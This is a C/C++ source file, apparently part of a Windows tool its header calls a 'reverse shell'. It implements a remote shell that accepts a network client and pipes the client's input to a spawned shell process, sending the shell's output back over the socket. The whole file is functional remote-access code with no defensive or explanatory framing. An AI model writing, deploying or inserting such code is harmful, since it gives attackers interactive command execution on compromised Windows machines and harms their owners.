#include "reverse-shell.h"

extern reverseShell_t	shell;

static BOOL processShouldStop(void) {
	if (shell.stopEventsignal != INVALID_HANDLE_VALUE) {
		if (WaitForSingleObject(shell.stopEventsignal, 0) == WAIT_OBJECT_0)
			return (TRUE);
	}
	return (FALSE);
}

static currentState_e acceptClient(void) {
	shell.clientSocket = accept(shell.listenSocket, NULL, NULL);

	int state = WSAGetLastError();
	if (shell.clientSocket == INVALID_SOCKET) {
		if (state == WSAEWOULDBLOCK)
			return (WAITING_FOR_CLIENT);
		return (RESET_SESSION);
	}
	setSocketNonBlock(&shell.clientSocket);
	return (CONTINUE_SESSION);
}

static currentState_e waitForClient(void) {
	if (newSession() == FATAL_ERROR)
		return (FATAL_ERROR);
	return (acceptClient());
}

static BYTE thereIsDataInPipe(void) {
	DWORD bytesAvalaible = 0;
	BOOL success = PeekNamedPipe(shell.parentRead, NULL, NULL, NULL, &bytesAvalaible, NULL);
	return (success && bytesAvalaible > 0);
}

static currentState_e sendToClient(void) {
	int bytesSent = 0;
	bytesSent = send(shell.clientSocket, shell.shellBuffer, (int)std::strlen(shell.shellBuffer), NULL);
	if (bytesSent == SOCKET_ERROR) {
		ZeroMemory(shell.shellBuffer, BUFFER_SIZE);
		return (RESET_SESSION);
	}
	ZeroMemory(shell.shellBuffer, BUFFER_SIZE);
	return (CONTINUE_SESSION);
}

static currentState_e readPipeAndSendToClient(void) {
	DWORD bytesRead = 0;

	if (!ReadFile(shell.parentRead, shell.shellBuffer, BUFFER_SIZE-1, &bytesRead, NULL))
		return (RESET_SESSION);

	shell.shellBuffer[bytesRead] = '\0';
	return (sendToClient());
}

static currentState_e processShellOutput(void) {
	if (thereIsDataInPipe())
		return (readPipeAndSendToClient());
	return (CONTINUE_SESSION);
}

static currentState_e tellToShell(void) {
	DWORD bytesWritten = 0;
	if (!WriteFile(shell.parentWrite, shell.clientBuffer, (DWORD)std::strlen(shell.clientBuffer), &bytesWritten, NULL)) {
		ZeroMemory(shell.clientBuffer, BUFFER_SIZE);
		return (RESET_SESSION);
	}
	ZeroMemory(shell.clientBuffer, BUFFER_SIZE);
	return (CONTINUE_SESSION);
}

static currentState_e processClientInput(void) {
	int bytesReceived = recv(shell.clientSocket, shell.clientBuffer, BUFFER_SIZE-1, 0);
	if (bytesReceived == SOCKET_ERROR) {
		if (WSAGetLastError() == WSAEWOULDBLOCK)
			return (CONTINUE_SESSION);
		//if (WSAGetLastError() == WSAECONNRESET)
		//	return (RESET_SESSION);
		return (RESET_SESSION);
	} else if (bytesReceived == CONNECTION_CLOSED)
		return (RESET_SESSION);
	shell.clientBuffer[bytesReceived] = '\0';
	return (tellToShell());
}

static currentState_e handleClientSession(void) {
	currentState_e state = {};

	state = processClientInput();
	if (state != CONTINUE_SESSION) return (state);

	state = processShellOutput();

	return (state);
}

void run(void) {
	currentState_e currentState = WAITING_FOR_CLIENT;

	while (currentState != FATAL_ERROR) {

		switch (currentState) {
			case (WAITING_FOR_CLIENT):
				currentState = waitForClient();
				break ;
			case (CONTINUE_SESSION):
				currentState = handleClientSession();
				break ;
			case (RESET_SESSION):
				currentState = WAITING_FOR_CLIENT;
				break ;
			case (FATAL_ERROR):
				return ;
		}
		if (processShouldStop() == TRUE)
			return ;
	}
	return ;
}